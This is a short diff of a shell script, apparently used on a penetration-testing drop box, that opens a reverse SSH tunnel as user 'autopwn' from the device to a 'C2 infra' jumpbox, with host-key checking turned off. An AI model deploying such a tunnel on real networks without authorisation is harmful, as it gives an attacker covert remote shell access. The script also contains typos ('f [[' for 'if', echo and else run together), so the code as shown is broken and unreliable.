@@ -4,7 +4,7 @@
 #I borrowed this from another GitHub like 3 years ago and honestly don't remember where - but I use it on my NUC for pen testing and like it. 
 
 createTunnel() {
-    /usr/bin/ssh -o StrictHostKeyChecking=no -i /root/.ssh/{key} -N -R 2222:localhost:22 root@{C2 infra IP}
+    /usr/bin/ssh -o StrictHostKeyChecking=no -i /home/pi/.ssh/{id_whatever} -N -R 2222:localhost:22 autopwn@{C2 infra IP}
     f [[ $? -eq 0 ]]; then
        echo Tunnel to jumpbox created successfully    else
         echo "[!] error occurred creating a tunnel to jumpbox"
